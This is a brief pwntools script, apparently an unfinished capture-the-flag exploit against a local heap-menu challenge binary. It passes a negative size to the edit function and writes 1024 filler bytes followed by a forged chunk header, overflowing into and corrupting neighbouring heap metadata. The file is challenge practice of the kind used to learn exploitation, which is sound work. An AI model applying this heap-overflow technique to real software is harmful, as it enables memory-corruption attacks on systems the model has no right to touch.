from pwn import *

context.log_level = "debug"
context.binary = elf = ELF('./chall')
p = process('./chall')
gdb.attach(p,'file chall\ninit-pwndbg')

def allocate(num, size):
    p.sendlineafter(">> ", '1')
    p.sendlineafter("allocate: ", str(num))
    p.sendlineafter(">> ", str(size))


def edit(idx,size, data):
    p.sendlineafter(">> ", '3')
    p.sendlineafter("edit: ", str(idx))
    p.sendlineafter("size: ", str(size))
    p.send(data)


def delete_last():
    p.sendlineafter(">> ", '2')

allocate(3,1)
edit(0 ,-1, "A"*1024+p64(0)+p64(0x410+0x411))
# delete_last()

p.interactive()
